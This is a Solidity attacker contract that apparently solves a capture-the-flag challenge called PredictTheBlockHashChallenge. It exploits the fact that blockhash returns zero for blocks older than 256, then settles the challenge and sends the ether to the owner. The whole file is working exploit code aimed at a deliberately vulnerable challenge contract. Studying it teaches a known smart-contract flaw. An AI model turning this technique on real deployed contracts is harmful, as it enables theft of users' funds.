pragma solidity ^0.4.21;

import "./PredictTheBlockHashChallenge.sol";

contract PredictTheBlockHashAttacker {
    address owner;
    address _victima;
    bytes32 guesshash;
    PredictTheBlockHashChallenge victimaSC;
    uint public settlementBlockNumber;

    function PredictTheBlockHashAttacker(address victima) public payable {
        owner = msg.sender;
        _victima = victima; // sc address to exploit
        guesshash = block.blockhash(block.number - 300); // our guess is the hash of a block very old!
        victimaSC = PredictTheBlockHashChallenge(_victima);
    }

    function lockInGuess() public payable {
        require(msg.value == 1 ether);
        
        victimaSC.lockInGuess.value(msg.value)(guesshash);
        settlementBlockNumber = block.number + 1;
    }

    function attack() public payable {

        bytes32 answer = block.blockhash(settlementBlockNumber);
        require (answer == guesshash);
        
        victimaSC.settle();

        withdraw();  // send all the bounty to the owner of the SC
    }

    function guess() public view returns (bytes32) {
        bytes32 answer = block.blockhash(settlementBlockNumber);
        return answer;
    }

    function settle() public {
        victimaSC.settle();

        withdraw();
    }

    function () public payable { }
    
    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
    
}